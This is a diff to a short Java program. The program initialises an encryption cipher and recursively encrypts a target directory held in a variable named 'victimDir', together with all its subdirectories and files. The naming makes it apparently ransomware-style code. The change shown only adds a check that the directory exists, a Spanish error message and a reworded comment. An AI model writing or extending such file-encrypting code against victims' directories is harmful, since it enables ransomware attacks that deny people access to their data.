@@ -28,14 +28,19 @@ public class Main {
 			int mode = Cipher.ENCRYPT_MODE;
 			cipher.init(mode, secretKey);
 			
-			encrypts(new File(victimDir));
+			File file = new File(victimDir);
+			if(file.exists()){
+				encrypts(file);
+			} else {
+				System.out.println("El directorio " + victimDir + " no existe");
+			}
 		} catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException e) {
 			e.printStackTrace();
 		}
 	}
 	
 	/**
-	 * This method encrypts a directory and all subdirectories and files.
+	 * This method encrypts a directory and all subdirectories and files from it.
 	 * @param file
 	 */
 	private static void encrypts(File file){
